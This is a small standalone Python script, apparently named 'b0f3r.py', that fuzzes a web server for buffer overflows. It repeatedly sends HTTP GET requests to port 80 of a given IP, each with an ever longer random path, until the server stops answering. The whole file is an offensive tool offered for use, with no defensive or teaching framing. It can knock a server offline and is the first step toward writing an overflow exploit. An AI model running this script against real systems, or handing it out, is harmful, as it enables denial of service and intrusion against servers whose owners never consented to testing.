#!/usr/bin/python
# do your magic change whatev3r ;)
import socket
import random
import string
import sys
###########PORT SET##############
sys_port = 80
#########################
if len(sys.argv) >= 2:
    sys_ip = sys.argv[1]
else:
    print("Usage: ./b0f3r.py IP")
    sys.exit(1)
i = 0
while True:
    try:
        i+=1
        size = 800
        los = i * size
        lad = string.ascii_lowercase + string.digits
        rs = ""
        for number in range(los):
            rs += random.choice(lad)
        inputBuffer = rs
        ss = socket.socket()
        ss.connect(("%s"%(sys_ip), sys_port))
        req = "GET /%s HTTP/1.1\r\n" %(inputBuffer)
        req += "Host: %s\r\n"%(sys_ip)
        req += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\r\n"
        req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        req += "Accept-Language: en-US,en;q=0.5\r\n"
        req += "Accept-Encoding: gzip, deflate\r\n"
        req += "\r\n"
        ss.send(req.encode())
        print((ss.recv(1024)))
        print(req)
        print("\nSending ... ")
        print(i)
        ss.close()
    except:
        print("Could not connect!")
        sys.exit()
